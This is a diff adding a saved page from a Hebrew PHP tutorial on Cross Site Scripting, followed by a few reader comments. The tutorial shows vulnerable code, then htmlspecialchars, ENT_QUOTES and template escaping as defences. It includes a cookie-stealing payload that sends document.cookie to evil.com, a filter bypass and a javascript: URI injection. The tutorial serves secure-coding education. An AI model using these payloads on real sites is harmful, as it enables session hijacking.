@@ -1,0 +1,266 @@
+﻿<!DOCTYPE html>
+<html lang="he" itemscope="" itemtype="http://schema.org/Article" ng-app="phpg">
+<head>
+<base href="https://phpguide.co.il/">
+<meta charset="utf-8">
+<meta name="description" content="סכנות ודרכי הגנה נגד הזרקות HTML.">
+<meta name="keywords" content="XSS, אבטחת מידע, HTML Injection, גניבת עוגיות">
+<meta name="author" content="iosolidar">
+<link rel="shortcut icon" href="static\images\favicon-1.ico">
+<!--[if lt IE 9]><script src="//html5shim.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+<link rel="stylesheet" type="text/css" href="static\styles\allstyles.compiled.css">
+<title>Cross Site Scripting</title>
+<meta itemprop="name" content="Cross Site Scripting">
+<meta itemprop="description" content="סכנות ודרכי הגנה נגד הזרקות HTML.">
+</head>
+<body dir='rtl' class="article"><script type="text/javascript">window.phpgstate={"post":{"id":"110","rating":"30","hasCurrentUserVoted":false}};</script>
+<div class='page-container'>
+<section id='header'>
+<div class="topRowHolder">
+<a class="logo" href="index-3.htm"><img src="static\images\logo.jpg"></a>
+<nav class="main">
+<ul>
+<li><a href="index-3.htm" class="active">פוסטים</a></li>
+<li><a href="qna-1.htm">פורום</a></li>
+</ul>
+<div class="clear"></div>
+</nav> <div class="clear"></div>
+</div>
+</section>  
+<div class="layout-holder">
+<section id="content">
+<h1 class='content-title'><span></span>Cross Site Scripting</h1>
+ 
+<div id="content-publishing-info">
+<div class="right">iosolidar, </div>
+<div class="right">&nbsp;<time datetime="2011-06-23T00:04:13+03:00" dir="rtl">23 ליוני 2011</time></div>
+<div class="clear"></div>
+</div>
+ 
+<article>
+<header>
+<div class="right post-image">
+<img src="static\images\pixel.png" title="http://images.freeola.co.uk/website-builder/tutorials/text-editor/html.jpg" alt="Cross Site Scripting">
+</div>
+<div class="right post-content">
+סכנות ודרכי הגנה נגד הזרקות HTML. <br>
+</div>
+<div class="clear"></div>
+</header>
+<br><br>
+<h3>מה זה XSS?</h3><br><h4>קצת על HTTP, HTML והדפדפן</h4><br><h5>* החלק הבא הוא אופציונלי ומאפשר הבנה טובה יותר של הנושא אך אין הוא דרוש להמשך המדריך</h5><br>כאשר נכנסים לאתר אינטרנט הדפדפן שבו אנחנו משתמשים עושה מספר פעולות שבסופם הוא מקבל פלט כלשהו מהשרת. השפה שבה הדפדפן מתקשר עם שרת האינטרנט נקראת HTTP שאלו ראשי התיבות ל-Hyper Text Transfer Protocol. בקשות האינטרנט מתחלקות לשני סוגים עיקריים בקשות POST ובקשות GET, כאשר בקשות GET מבקשות משאב מסויים מהשרת ובקשות POST עושות פעולה כלשהיא. לדוגמה אם אנחנו מעוניינים לצפות בתמונה כלשהי על השרת אנחנו יכולים להיכנס ל-URL הבא:<br><div class="php codeblock">http<span class="sy0">:</span><span class="co1">//example.com/images/lolcat.jpeg</span></div><br>כאשר מכניסים את ה-URL הבא לשורת הדפדפן, הוא עושה מספר פעולות. הוא מפרק את ה-URL לשלושה חלקים, החלק הראשון זה הפרוטוקול שבו משתמשים במקרה הזה HTTP ולאחריו נקודתיים וסלאש כפול. ישנם פרוטוקולים נוספים שבהתאם לדפדפן יכולים להיתמך או לא, לדוגמה <span dir="ltr">FTP://</span> יתחבר לשרת באמצעות פרוטוקול FTP ולא HTTP, ו-<span dir="ltr">HTTPS://</span> יתחבר לשרת בצורה מאובטחת מעל הצפנת SSL. לאחר מכן מגיע החלק של ה-host או שם השרת שאליו אנחנו מעוניינים להתחבר, שבמקרה הזה מדובר ב-example.com ולאחריו מגיע המשאב שאותו אנחנו מעוניינים לקבל מהשרת, במקרה הזה:<br><div class="php codeblock"><span class="sy0">/</span>images<span class="sy0">/</span>lolcat<span class="sy0">.</span>jpeg</div><br>השרת יקבל את הבקשה וברוב המקרים יחפש קובץ ב-שם images/lolcat.jpeg על השרת ויחזיר את התוכן שלו לדפדפן (ברוב המקרים כיוון שניתן לכתוב סקריפט שיבצע פעולות אחרות במקרה כזה). <br>ניתן להעביר פרמטרים לשרת באמצעות התחביר הבא:<br><div class="php codeblock">http<span class="sy0">:</span><span class="co1">//example.com/script.php?name=value&amp;name2=value2</span></div><br>במקרה שמותקן מפרש PHP על השרת כאשר השרת יתקל ב-URL כזה במקום להחזיר את התוכן של script.php הוא יריץ אותו בתור תוכנה עצמאית. PHP תנתח את ה-URL ותייצר ממנו מספר משתנים גלובליים למתכנת, במקרה הזה היא תיצור מערך אסוציאטיבי (שהמפתחות בו הם שמות ולא מספרים) בשם <span dir="ltr">$_GET</span> ותכניס לתוכו את המפתח name עם הערך value ואת המפתח name2 עם הערך value2<br><div class="php codeblock"><span class="kw2">&lt;?php</span><br>
+<span class="kw1">echo</span> <span class="re0">$_GET</span><span class="br0">&#91;</span><span class="st_h">'name'</span><span class="br0">&#93;</span><span class="sy0">;</span> <span class="co1">// output: value</span><br>
+<span class="kw1">echo</span> <span class="re0">$_GET</span><span class="br0">&#91;</span><span class="st_h">'name2'</span><span class="br0">&#93;</span><span class="sy0">;</span> <span class="co1">// output: value2</span><br>
+<span class="sy1">?&gt;</span></div><br><br>בקשת POST פועלת באותה הדרך אך היא שונה מעט כאשר הפרמטרים שמועברים דרך הבקשה לא מופיעים ב-URL אלא נשלחים בגוף בקשת ה-HTTP.<br><br><br><br><h3>XSS</h3><br><br>באפליקציות PHP הרבה פעמים נרצה להשתמש בקלט של המשתמש בשביל להציג את הדף בדרך מסוימת. לדוגמה בחיפוש באתר נרצה שמחרוזת החיפוש של המשתמש תופיע בתוך שדה ה-text:<br><div class="php codeblock"><span class="sy1">&lt;?</span><br>
+<span class="kw2">function</span> search_user<span class="br0">&#40;</span><span class="re0">$query</span><span class="br0">&#41;</span> <span class="br0">&#123;</span><br>
+&nbsp; <span class="re0">$conn</span> <span class="sy0">=</span> <span class="kw3">mysql_connect</span><span class="br0">&#40;</span><span class="st_h">'localhost'</span><span class="sy0">,</span> <span class="st_h">'user'</span><span class="sy0">,</span> <span class="st_h">'pass'</span><span class="br0">&#41;</span><span class="sy0">;</span><br>
+&nbsp; <span class="kw3">mysql_select_db</span><span class="br0">&#40;</span><span class="st_h">'database'</span><span class="br0">&#41;</span><span class="sy0">;</span><br>
+&nbsp; <br>
+&nbsp; <span class="re0">$result</span> <span class="sy0">=</span> <span class="kw3">mysql_query</span><span class="br0">&#40;</span><span class="st0">&quot;SELECT id, username, description from Users where username like '%&quot;</span> <span class="sy0">.</span> <span class="kw3">mysql_real_escape_string</span><span class="br0">&#40;</span><span class="re0">$query</span><span class="br0">&#41;</span> <span class="sy0">.</span> <span class="st0">&quot;%'&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span><br>
+<br>
+&nbsp; <span class="kw1">return</span> <span class="re0">$result</span><span class="sy0">;</span><br>
+<span class="br0">&#125;</span><br>
+<span class="re0">$q</span> <span class="sy0">=</span> <span class="kw3">isset</span><span class="br0">&#40;</span><span class="re0">$_GET</span><span class="br0">&#91;</span><span class="st_h">'query'</span><span class="br0">&#93;</span><span class="br0">&#41;</span> ? <span class="re0">$_GET</span><span class="br0">&#91;</span><span class="st_h">'query'</span><span class="br0">&#93;</span><span class="sy0">:</span><span class="st_h">''</span><span class="sy0">;</span><br>
+<span class="sy1">?&gt;</span><br>
+<br>
+&lt;form action=&quot;&quot; method=&quot;get&quot;&gt;<br>
+&nbsp; query: &lt;input type=&quot;text&quot; name=&quot;query&quot; id=&quot;query&quot; value=&quot;<span class="sy1">&lt;?=</span><span class="re0">$q</span><span class="sy1">?&gt;</span>&quot; /&gt;<br>
+&nbsp; &lt;input type=&quot;submit&quot; value=&quot;search&quot; id=&quot;submit&quot; name=&quot;submit&quot; /&gt;<br>
+&lt;/form&gt;<br>
+<br>
+<span class="sy1">&lt;?</span><br>
+<span class="kw1">if</span> <span class="br0">&#40;</span><span class="re0">$q</span><span class="br0">&#41;</span> <span class="br0">&#123;</span><br>
+&nbsp; <span class="re0">$results</span> <span class="sy0">=</span> search_user<span class="br0">&#40;</span><span class="re0">$q</span><span class="br0">&#41;</span><span class="sy0">;</span><br>
+&nbsp; <br>
+&nbsp; <span class="kw1">while</span> <span class="br0">&#40;</span><span class="re0">$row</span> <span class="sy0">=</span> <span class="kw3">mysql_fetch_assoc</span><span class="br0">&#40;</span><span class="re0">$results</span><span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span><br>
+&nbsp; &nbsp; <span class="kw1">echo</span> <span class="st0">&quot;&lt;div class='search-result'&gt;&quot;</span><span class="sy0">;</span><br>
+&nbsp; &nbsp; <span class="kw1">echo</span> <span class="st0">&quot;&lt;a href='/users/&quot;</span> <span class="sy0">.</span> <span class="re0">$row</span><span class="br0">&#91;</span><span class="st_h">'id'</span><span class="br0">&#93;</span> <span class="sy0">.</span> <span class="st0">&quot;'&gt;&quot;</span> <span class="sy0">.</span> <span class="re0">$row</span><span class="br0">&#91;</span><span class="st_h">'username'</span><span class="br0">&#93;</span> <span class="sy0">.</span> <span class="st0">&quot;&lt;/a&gt;&quot;</span><span class="sy0">;</span><br>
+&nbsp; &nbsp; <span class="kw1">echo</span> <span class="st0">&quot;&lt;p&gt;&quot;</span> <span class="sy0">.</span> <span class="re0">$row</span><span class="br0">&#91;</span><span class="st_h">'description'</span><span class="br0">&#93;</span> <span class="sy0">.</span> <span class="st0">&quot;&lt;/p&gt;&quot;</span><span class="sy0">;</span><br>
+&nbsp; &nbsp; <span class="kw1">echo</span> <span class="st0">&quot;&lt;/div&gt;&quot;</span><span class="sy0">;</span><br>
+&nbsp; <span class="br0">&#125;</span><br>
+<span class="br0">&#125;</span><br>
+<span class="sy1">?&gt;</span></div><br><br>שימו לב לשורה הבאה:<br><div class="php codeblock">query: &lt;input type=&quot;text&quot; name=&quot;query&quot; id=&quot;query&quot; value=&quot;<span class="sy1">&lt;?=</span><span class="re0">$q</span><span class="sy1">?&gt;</span>&quot; /&gt;</div><br><br>אנחנו לוקחים את הקלט של המשתמש ומכניסים אותו לתוך שדה ה-value של שורת החיפוש. זה שימושי במקרים מסוימים כמו בדוגמה הזו שנרצה להקל על המשתמש שאולי שגה בדרך שבה הוא כתב את השם או לשנות את מחרוזת החיפוש שלו בכדי לקבל תוצאות יותר רלוונטיות. כשאני נכנס ל-URL הבא:<br><div class="php codeblock">http<span class="sy0">:</span><span class="co1">//example.com/script.php?query=ad</span></div><br><br>הפלט שאני מקבל הוא זה:<br><div class="php codeblock"><span class="sy0">&lt;</span>form action<span class="sy0">=</span><span class="st0">&quot;&quot;</span> method<span class="sy0">=</span><span class="st0">&quot;get&quot;</span><span class="sy0">&gt;</span><br>
+&nbsp;query<span class="sy0">:</span><br>
+&nbsp;<span class="sy0">&lt;</span>input type<span class="sy0">=</span><span class="st0">&quot;text&quot;</span> name<span class="sy0">=</span><span class="st0">&quot;query&quot;</span> id<span class="sy0">=</span><span class="st0">&quot;query&quot;</span> value<span class="sy0">=</span><span class="st0">&quot;ad&quot;</span> <span class="sy0">/&gt;</span><br>
+&nbsp;<span class="sy0">&lt;</span>input type<span class="sy0">=</span><span class="st0">&quot;submit&quot;</span> value<span class="sy0">=</span><span class="st0">&quot;search&quot;</span> id<span class="sy0">=</span><span class="st0">&quot;submit&quot;</span> name<span class="sy0">=</span><span class="st0">&quot;submit&quot;</span> <span class="sy0">/&gt;</span><br>
+<span class="sy0">&lt;/</span>form<span class="sy0">&gt;</span><br>
+<br>
+<span class="sy0">&lt;</span>div <span class="kw2">class</span><span class="sy0">=</span><span class="st0">&quot;search-result&quot;</span><span class="sy0">&gt;</span><br>
+&nbsp;<span class="sy0">&lt;</span>a href<span class="sy0">=</span><span class="st0">&quot;/users/0&quot;</span><span class="sy0">&gt;</span><br>
+&nbsp; admin<br>
+&nbsp;<span class="sy0">&lt;/</span>a<span class="sy0">&gt;</span><br>
+&nbsp;<span class="sy0">&lt;</span>p<span class="sy0">&gt;</span><br>
+&nbsp; this is the administrator description<br>
+&nbsp;<span class="sy0">&lt;/</span>p<span class="sy0">&gt;</span><br>
+<span class="sy0">&lt;/</span>div<span class="sy0">&gt;</span><br>
+<span class="sy0">&lt;</span>div <span class="kw2">class</span><span class="sy0">=</span><span class="st0">&quot;search-result&quot;</span><span class="sy0">&gt;</span><br>
+&nbsp;<span class="sy0">&lt;</span>a href<span class="sy0">=</span><span class="st0">&quot;/users/1&quot;</span><span class="sy0">&gt;</span><br>
+&nbsp; adam<br>
+&nbsp;<span class="sy0">&lt;/</span>a<span class="sy0">&gt;</span><br>
+&nbsp;<span class="sy0">&lt;</span>p<span class="sy0">&gt;</span><br>
+&nbsp; some testing strings here<br>
+&nbsp;<span class="sy0">&lt;/</span>p<span class="sy0">&gt;</span><br>
+<span class="sy0">&lt;/</span>div<span class="sy0">&gt;</span></div><br><br>הערך שהכנסו בחיפוש מופיע בתוך קוד המקור. מה יקרה אם נכניס ערכים אחרים?<br><br><div class="php codeblock">http<span class="sy0">:</span><span class="co1">//example.com/script.php?query=hack” style=&quot;color:red</span></div><br><br>הפלט שנקבל הוא:<br><div class="php codeblock"><span class="sy0">&lt;</span>form action<span class="sy0">=</span><span class="st0">&quot;&quot;</span> method<span class="sy0">=</span><span class="st0">&quot;get&quot;</span><span class="sy0">&gt;</span><br>
+&nbsp; &nbsp; &nbsp; &nbsp; query<span class="sy0">:</span> <span class="sy0">&lt;</span>input type<span class="sy0">=</span><span class="st0">&quot;text&quot;</span> name<span class="sy0">=</span><span class="st0">&quot;query&quot;</span> id<span class="sy0">=</span><span class="st0">&quot;query&quot;</span> value<span class="sy0">=</span><span class="st0">&quot;ad&quot;</span> style<span class="sy0">=</span><span class="st0">&quot;color:red&quot;</span> <span class="sy0">/&gt;</span><br>
+&nbsp; &nbsp; &nbsp; &nbsp; <span class="sy0">&lt;</span>input type<span class="sy0">=</span><span class="st0">&quot;submit&quot;</span> value<span class="sy0">=</span><span class="st0">&quot;search&quot;</span> id<span class="sy0">=</span><span class="st0">&quot;submit&quot;</span> name<span class="sy0">=</span><span class="st0">&quot;submit&quot;</span> <span class="sy0">/&gt;</span><br>
+<span class="sy0">&lt;/</span>form<span class="sy0">&gt;</span></div><br>הדפדפן לא מסוגל להבחין בהבדל שבן הקוד שלנו לבין הקלט של המשתמש, ולכן ה-html הנוצר מפוענח על ידי הדפדפן כפי שהוא ועל ידי הכנסת קלט מסוים כלשהו הצלחנו לגרום לעמוד להשתנות.<br>זה נקרא HTML Injection או XSS שזה ראשי תיבות Cross Site Scripting (עם X במקום C). בגלל שאין לדפדפן שום דרך להבדיל בין קוד לקלט משתמש תוקף יכול לנצל את המתקפה ולפגוע במשתמשים ובאתר. לדוגמה תוקף יכול ליצור את ה-URL הבא:<br><div class="php codeblock">http<span class="sy0">:</span><span class="co1">//localhost/x.php?query=&quot;&gt;&lt;script&gt;new Image().src = 'http://evil.com/evilscript.php?cookie='%2bescape(document.cookie);&lt;/script&gt;</span></div><br>בתוך קוד המקור יופיע:<br><div class="php codeblock"><span class="sy0">&lt;</span>form action<span class="sy0">=</span><span class="st0">&quot;&quot;</span> method<span class="sy0">=</span><span class="st0">&quot;get&quot;</span><span class="sy0">&gt;</span><br>
+&nbsp; &nbsp; &nbsp; &nbsp; query<span class="sy0">:</span> <span class="sy0">&lt;</span>input type<span class="sy0">=</span><span class="st0">&quot;text&quot;</span> name<span class="sy0">=</span><span class="st0">&quot;query&quot;</span> id<span class="sy0">=</span><span class="st0">&quot;query&quot;</span> value<span class="sy0">=</span><span class="st0">&quot;&quot;</span><span class="sy0">&gt;&lt;</span>script<span class="sy0">&gt;</span>new Image<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">.</span>src <span class="sy0">=</span> <span class="st_h">'http://evil.com/evilscript.php?cookie='</span><span class="sy0">+</span>escape<span class="br0">&#40;</span>document<span class="sy0">.</span>cookie<span class="br0">&#41;</span><span class="sy0">;&lt;/</span>script<span class="sy0">&gt;</span><span class="st0">&quot; /&gt;<br>
+&nbsp; &nbsp; &nbsp; &nbsp; &lt;input type=&quot;</span>submit<span class="st0">&quot; value=&quot;</span>search<span class="st0">&quot; /&gt;<br>
+&lt;/form&gt;</span></div><br>תגיות ה-script מאפשרות לתוקף להכניס קוד javascript שבאמצעותו התוקף שולח את עוגיות המשתמש לשרת שנמצא בשליטתו. לאחר מכן הוא יכול לשלוח מייל לבעל האתר עם ה-URL המסוכן (ניתן להסוות אותו באמצעות שירותים לקיצור URL) לחטוף את העוגיות של האדמין ולהתחבר ללוח הניהול של המערכת.<br><br><h4>XSS קבוע</h4><br>הדוגמה הקודמת דיברה על XSS זמני, או XSS שבו נדרשת התערבות משתמש בכדי שתוקף יוכל לנצל אותה (כניסה ל-URL עם הקוד הבעייתי). אך ישנו סוג נוסף של XSS שנמצא במקומות שבהם שומרים את המידע ומציגים אותו למשתמש בהמשך כמו טפסי הרשמה או מערכות תגובה. לדוגמה בהרשמה לאתר המשתמש מספק לנו פרטים שאנחנו לאחר מכן מכניסים לבסיס הנתונים כמו שם המשתמש הסיסמה והאימייל. במקרה שבו נציג את הפרטים של המשתמש (לדוגמה בחלק התחתון של פורום שבו נציג משתמשים חדשים שהצטרפו לאתר) תוקף יכול לנצל את זה בכדי להכניס קוד HTML ולעשות דפייס לעמוד (להציג תוכן משלו כמו &quot;האתר הזה נפרץ על ידי l33tCracker”).<br><br><h4>סיכום ביניים</h4><br>XSS היא מתקפה מאוד מסוכנת שיכולה לאפשר לתוקף השתלטות מלאה על האתר והרס חלקים נרחבים ממנו. לא ניתן לסמוך על קלט משתמש שעלול לנצל פונקציות במערכת בכדי לקבל גישה לחלקים סגורים במקרה הטוב או להרוס את האתר במקרה הפחות טוב.<br>דרכי הגנה<br>black list<br>ישנם אתרים שמשתמשים במערכת לסינון מילים/ביטויים מסוימים מקלט המשתמש בכדי למנוע XSS. זו דרך שתמיד תהיה רעה כיוון שישנם צירופים רבים של מחרוזות שיכולים לאפשר לתוקף לנצל את המתקפה. לדוגמה סינון של תגיות script באמצעות regex שהוא סינון נפוץ:<br><div class="php codeblock"><span class="kw2">function</span> xss_filter<span class="br0">&#40;</span><span class="re0">$str</span><span class="br0">&#41;</span> <span class="br0">&#123;</span><br>
+&nbsp; <span class="kw1">return</span> <span class="kw3">preg_replace</span><span class="br0">&#40;</span><span class="st0">&quot;/&lt;script.+&gt;.+&lt;\/script&gt;/&quot;</span><span class="sy0">,</span> <span class="st_h">''</span><span class="sy0">,</span> <span class="re0">$str</span><span class="br0">&#41;</span><span class="sy0">;</span><br>
+<span class="br0">&#125;</span><br>
+<br>
+<span class="kw1">echo</span> xss_filter<span class="br0">&#40;</span><span class="st0">&quot;hello world&lt;script&gt;alert('XSS');&lt;/script&gt;&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span><br>
+<br>
+output<span class="sy0">:</span> hello world</div><br>המסנן הזה יתפוס מקרים מאוד פשוטים, אך כל מה שצריך בכדי לעבור אותו הוא לשנות את המילה script למילה SCRIPT ומכיוון שלא הוספנו דגל i (שיתפוס ביטויים באותיות קטנות או גדולות) אז המסנן הזה לא יפעל.<br>ישנם מסננים שתופסים הרבה יותר אפשרויות, אך אין שום מסנן שמבוסס על רשימה שחורה של ביטויים שיכול להבטיח שתוקף לא יוכל לעבור אותו.<br><br><h3>htmlspecialchars וייצוג HTML</h3><br>הדרך הנכונה והמומלצת למניעת XSS היא תרגום של תווים בעייתיים לתווי תצוגה ב-HTML. אם נרצה להציג לדוגמה את התו &lt; בדפדפן נשתמש ב-&amp;lt;, הדפדפן לא יתייחס אל הייצוג הזה כחלק מן הקוד אלא יציג אותו למשתמש כתו &lt;.<br>ב-PHP ישנה פונקציה שנקראת htmlspecialchars שעושה את ההמרה לתווי ייצוג HTML בצורה אוטומטית. דוגמה לשימוש בדוגמאת החיפוש של קודם:<br><div class="php codeblock"><span class="kw2">&lt;?php</span><br>
+<span class="kw2">function</span> search_user<span class="br0">&#40;</span><span class="re0">$query</span><span class="br0">&#41;</span> <span class="br0">&#123;</span><br>
+&nbsp; <span class="re0">$conn</span> <span class="sy0">=</span> <span class="kw3">mysql_connect</span><span class="br0">&#40;</span><span class="st_h">'localhost'</span><span class="sy0">,</span> <span class="st_h">'user'</span><span class="sy0">,</span> <span class="st_h">'pass'</span><span class="br0">&#41;</span><span class="sy0">;</span><br>
+&nbsp; <span class="kw3">mysql_select_db</span><span class="br0">&#40;</span><span class="st_h">'database'</span><span class="br0">&#41;</span><span class="sy0">;</span><br>
+&nbsp; <br>
+&nbsp; <span class="re0">$result</span> <span class="sy0">=</span> <span class="kw3">mysql_query</span><span class="br0">&#40;</span><span class="st0">&quot;SELECT id, username, description from Users where username like '%&quot;</span> <span class="sy0">.</span> <span class="kw3">mysql_real_escape_string</span><span class="br0">&#40;</span><span class="re0">$query</span><span class="br0">&#41;</span> <span class="sy0">.</span> <span class="st0">&quot;%'&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span><br>
+<br>
+&nbsp; <span class="kw1">return</span> <span class="re0">$result</span><span class="sy0">;</span><br>
+<span class="br0">&#125;</span><br>
+<span class="re0">$q</span> <span class="sy0">=</span> <span class="kw3">isset</span><span class="br0">&#40;</span><span class="re0">$_GET</span><span class="br0">&#91;</span><span class="st_h">'query'</span><span class="br0">&#93;</span><span class="br0">&#41;</span> ? <span class="re0">$_GET</span><span class="br0">&#91;</span><span class="st_h">'query'</span><span class="br0">&#93;</span><span class="sy0">:</span><span class="st_h">''</span><span class="sy0">;</span><br>
+<span class="sy1">?&gt;</span><br>
+<br>
+&lt;form action=&quot;&quot; method=&quot;get&quot;&gt;<br>
+&nbsp; query: &lt;input type=&quot;text&quot; name=&quot;query&quot; id=&quot;query&quot; value=&quot;<span class="sy1">&lt;?=</span><span class="kw3">htmlspecialchars</span><span class="br0">&#40;</span><span class="re0">$q</span><span class="br0">&#41;</span><span class="sy0">;</span> <span class="sy1">?&gt;</span>&quot; /&gt;<br>
+&nbsp; &lt;input type=&quot;submit&quot; value=&quot;search&quot; id=&quot;submit&quot; name=&quot;submit&quot; /&gt;<br>
+&lt;/form&gt;<br>
+<br>
+<span class="sy1">&lt;?</span><br>
+<span class="kw1">if</span> <span class="br0">&#40;</span><span class="re0">$q</span><span class="br0">&#41;</span> <span class="br0">&#123;</span><br>
+&nbsp; <span class="re0">$results</span> <span class="sy0">=</span> search_user<span class="br0">&#40;</span><span class="re0">$q</span><span class="br0">&#41;</span><span class="sy0">;</span><br>
+&nbsp; <br>
+&nbsp; <span class="kw1">while</span> <span class="br0">&#40;</span><span class="re0">$row</span> <span class="sy0">=</span> <span class="kw3">mysql_fetch_assoc</span><span class="br0">&#40;</span><span class="re0">$results</span><span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span><br>
+&nbsp; &nbsp; <span class="kw1">echo</span> <span class="st0">&quot;&lt;div class='search-result'&gt;&quot;</span><span class="sy0">;</span><br>
+&nbsp; &nbsp; <span class="kw1">echo</span> <span class="st0">&quot;&lt;a href='/users/&quot;</span> <span class="sy0">.</span> <span class="re0">$row</span><span class="br0">&#91;</span><span class="st_h">'id'</span><span class="br0">&#93;</span> <span class="sy0">.</span> <span class="st0">&quot;'&gt;&quot;</span> <span class="sy0">.</span> <span class="re0">$row</span><span class="br0">&#91;</span><span class="st_h">'username'</span><span class="br0">&#93;</span> <span class="sy0">.</span> <span class="st0">&quot;&lt;/a&gt;&quot;</span><span class="sy0">;</span><br>
+&nbsp; &nbsp; <span class="kw1">echo</span> <span class="st0">&quot;&lt;p&gt;&quot;</span> <span class="sy0">.</span> <span class="re0">$row</span><span class="br0">&#91;</span><span class="st_h">'description'</span><span class="br0">&#93;</span> <span class="sy0">.</span> <span class="st0">&quot;&lt;/p&gt;&quot;</span><span class="sy0">;</span><br>
+&nbsp; &nbsp; <span class="kw1">echo</span> <span class="st0">&quot;&lt;/div&gt;&quot;</span><span class="sy0">;</span><br>
+&nbsp; <span class="br0">&#125;</span><br>
+<span class="br0">&#125;</span></div><br>בדפדפן אני מכניס את ה-URL הבא:<br><div class="php codeblock">http<span class="sy0">:</span><span class="co1">//example.com/script.php?query=”&gt;&lt;script&gt;alert(“XSS”);&lt;/script&gt;</span></div><br>והפלט שאני מקבל:<br><div class="php codeblock"><span class="sy0">&lt;</span>form action<span class="sy0">=</span><span class="st0">&quot;&quot;</span> method<span class="sy0">=</span><span class="st0">&quot;get&quot;</span><span class="sy0">&gt;</span><br>
+&nbsp; &nbsp; &nbsp; &nbsp; query<span class="sy0">:</span> <span class="sy0">&lt;</span>input type<span class="sy0">=</span><span class="st0">&quot;text&quot;</span> name<span class="sy0">=</span><span class="st0">&quot;query&quot;</span> id<span class="sy0">=</span><span class="st0">&quot;query&quot;</span> value<span class="sy0">=</span><span class="st0">&quot;&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(&amp;quot;XSS&amp;quot;);&amp;lt;/script&amp;gt;&quot;</span> <span class="sy0">/&gt;</span><br>
+&nbsp; &nbsp; &nbsp; &nbsp; <span class="sy0">&lt;</span>input type<span class="sy0">=</span><span class="st0">&quot;submit&quot;</span> value<span class="sy0">=</span><span class="st0">&quot;search&quot;</span> <span class="sy0">/&gt;</span><br>
+<span class="sy0">&lt;/</span>form<span class="sy0">&gt;</span></div><br>הפונקציה המירה את כל התווים הבעייתים לייצוג ה-HTML שלהם ומנעה XSS. אך תוקף יכול להשתמש בתווים בקידוד מולטי-בייט שונה בשביל להבריח מידע דרך המסנן או בשימוש ב-&#039; יחיד שבברירת המחדל לא מסונן. בשביל למנוע את זה צריך להשתמש באופציה ENT_QUOTES ל-htmlspecialchars בדרך הבאה:<br><div class="php codeblock"><span class="kw1">echo</span> <span class="kw3">htmlspecialchars</span><span class="br0">&#40;</span><span class="re0">$input</span><span class="sy0">,</span> <span class="kw4">ENT_QUOTES</span><span class="br0">&#41;</span><span class="sy0">;</span></div><br>אך עדיין יש דרכים לנצל את המתקפה גם עם סינון תווים בעייתים לדוגמה בשימוש בתווים מותרים במקומות אסטרטגיים:<br><div class="php codeblock"><span class="re0">$img_id</span> <span class="sy0">=</span> <span class="re0">$_GET</span><span class="br0">&#91;</span><span class="st_h">'img'</span><span class="br0">&#93;</span><span class="sy0">;</span><br>
+<span class="kw1">echo</span> “You are viewing image number<span class="sy0">:</span> <span class="re0">$img_id</span><span class="sy0">&lt;</span>br <span class="sy0">/&gt;</span>”<span class="sy0">;</span><br>
+<span class="kw1">echo</span> “<span class="sy0">&lt;</span>img src<span class="sy0">=</span><span class="st_h">'$img_id.jpg'</span> <span class="sy0">/&gt;</span>”<span class="sy0">;</span></div><br>התוקף יכול ליצור URL כזה:<br><div class="php codeblock">http<span class="sy0">:</span><span class="co1">//example.com/script.php?img=javascript:alert(String.fromCharCode(120,115,115));//</span></div><br><br>הפלט:<br><div class="php codeblock">You are viewing image number<span class="sy0">:</span> javascript<span class="sy0">:</span>alert<span class="br0">&#40;</span>String<span class="sy0">.</span>fromCharCode<span class="br0">&#40;</span><span class="nu0">120</span><span class="sy0">,</span> <span class="nu0">115</span><span class="sy0">,</span> <span class="nu0">115</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">;</span><span class="co1">//&lt;br /&gt;&lt;img src='javascript:alert(String.fromCharCode(120, 115, 115));//.jpg' /&gt;</span></div><br>אין הרבה שניתן לעשות בכדי למנוע מקרים כאלה ולכן עדיף בהכנסת ערכים לתכונות כמו src של אלמנטי HTML לבדוק שהערך מתחיל ב-path קבוע (לדוגמה /images) או בתו /. <br><br><h3>סיכום</h3><br>XSS היא מתקפה שיכולה להיות הרסנית לאתר, במהלך השנים פותחו שיטות רבות לעבור מסננים שונים בכדי לנצל אותה. מתכנתי PHP צריכים להיות מודעים להשלכות של המתקפה ולדרכים שבהם היא פועלת בכדי לכתוב קוד בטוח, בניגוד למתקפות אחרות קשה להגן מפני XSS בצורה מלאה וצריכים להיות מודעים להשלכות של ביטויים תוך כדי כתיבת הקוד. בשביל להוריד את הסיכויים לקיומו של הבאג הדרך המומלצת לעבוד היא באמצעות מתודולוגית MVC ובעיקר הפרדה של ה-templates מהקוד, כך ניתן ליצור מסנן גלובאלי יעיל. ב-smarty (שהיא מערכת templates) ישנה אופציה להוסיף פונקציות גלובאליות לטיפול במשתנים, בשביל למנוע XSS ניתן להוסיף את האופציה הזו:<br><div class="php codeblock"><span class="re0">$smarty</span><span class="sy0">-&gt;</span><span class="me1">default_modifiers</span> <span class="sy0">=</span> <span class="kw3">array</span><span class="br0">&#40;</span><span class="st_h">'escape:htmlall'</span><span class="br0">&#41;</span><span class="sy0">;</span></div><br>שתסנן את המשתנים בצורה אוטומטית. </article>
+<br><br>
+<div class="info_box" data-ng-controller="PostViewCtrl">
+<div class="right left-spaced">
+<img src="static\images\pixel.png" title="http://www.gravatar.com/avatar/577835562fa9e54ea5f73adf6b887062?s=16&r=g&d=monsterid" alt="iosolidar">
+<a>iosolidar</a>
+</div>
+<div class="clear"></div>
+</div>
+<div>
+</div>
+<section class="comments" id='post_comments'>
+<h2>תגובות לכתבה:</h2>
+<a id="comment754"></a>
+<div class="blog-comment">
+<span class='comment-author'>אנונימי</span><span dir="rtl">&nbsp;</span>
+<span dir="ltr" class='comment-date'>10/09/2011 13:00</span><br>
+תודה מדריך שלם מורחב ויעיל מאוד , כל הכבוד .</div>
+<a id="comment983"></a>
+<div class="blog-comment">
+<span class='comment-author'>OrelBeY</span><span dir="rtl">&nbsp;</span>
+<span dir="ltr" class='comment-date'>18/12/2011 21:12</span><br>
+מדריך מעולה, תודה רבה וכל הכבוד. :)</div>
+<a id="comment1163"></a>
+<div class="blog-comment">
+<span class='comment-author'>אנונימי</span><span dir="rtl">&nbsp;</span>
+<span dir="ltr" class='comment-date'>25/01/2012 22:53</span><br>
